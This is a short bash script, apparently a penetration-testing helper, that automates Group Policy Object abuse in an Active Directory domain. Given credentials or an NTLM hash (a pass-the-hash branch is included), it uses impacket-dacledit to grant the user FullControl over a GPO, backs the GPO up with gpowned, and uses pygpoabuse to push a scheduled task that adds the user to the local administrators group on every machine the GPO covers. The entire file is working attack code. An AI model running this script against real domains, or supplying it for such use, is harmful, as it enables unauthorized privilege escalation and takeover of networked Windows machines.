#!/bin/bash

domain="$1"
user="$2"
password="$3"
gpo_guid="$4"
target_ip="$5"

domain_prefix="$(echo $domain | cut -d'.' -f1)"
domain_suffix="$(echo $domain | cut -d'.' -f2)"
domain_caps="$(echo $domain_prefix | tr \[:lower:\] \[:upper:\])"
gpo_ldap_query="CN={$gpo_guid},CN=Policies,CN=System,DC=$domain_prefix,DC=$domain_suffix"

if [ -d "backupgpo" ]
then
  rm -rf backupgpo
fi

if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
then
  # Pass the Hash
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip -hashes :$password $domain/$user -action write -rights FullControl

  gpowned -u $user -hashes :$password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "net localgroup administrators $domain_caps\\$user /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip $target_ip -v
else
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip $domain/$user:$password -action write -rights FullControl

  gpowned -u $user -p $password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "net localgroup administrators $domain_caps\\$user /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip $target_ip -v
fi
